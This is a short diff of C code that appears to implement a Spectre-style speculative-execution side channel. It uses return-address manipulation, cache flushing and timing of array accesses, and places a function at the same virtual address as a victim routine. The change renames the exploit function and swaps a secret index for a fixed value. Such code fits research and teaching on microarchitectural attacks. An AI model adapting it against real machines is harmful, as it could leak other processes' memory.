@@ -10,8 +10,8 @@ char array[256*256];
 
 #define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"
 
-char array[256*256];
 int total = 0;
+int magic = 123;
 
 inline void timeAndFlush(ADDR_PTR addr) {
 	printAccessTime(addr);
@@ -44,13 +44,13 @@ void checkForMisspeculation() {
 			: "r" (address)
 		);
 	
-		total += measure_one_block_access_time((ADDR_PTR)&array[secret]);
-		clflush((void *)&array[secret]);
+		total += measure_one_block_access_time((ADDR_PTR)&array[magic]);
+		clflush((void *)&array[magic]);
 	}
 }
 
-void exploit() { // this should be at the same VA as victim's callLoop()
-	volatile int temp = array[secret];
+void runMeSpeculatively() { // this should be at the same VA as victim's callLoop()
+	volatile int temp = array[magic];
 }
 
 int main(int argc, char *argv[]){
@@ -75,7 +75,7 @@ int main(int argc, char *argv[]){
 
 	printf("ptr is %p\n", ptr);
 
-	ptr = memcpy(ptr, (void *)&gadget, 32);
+	ptr = memcpy(ptr, (void *)&runMeSpeculatively, 32);
 
 	((int (*)())ptr)();
 
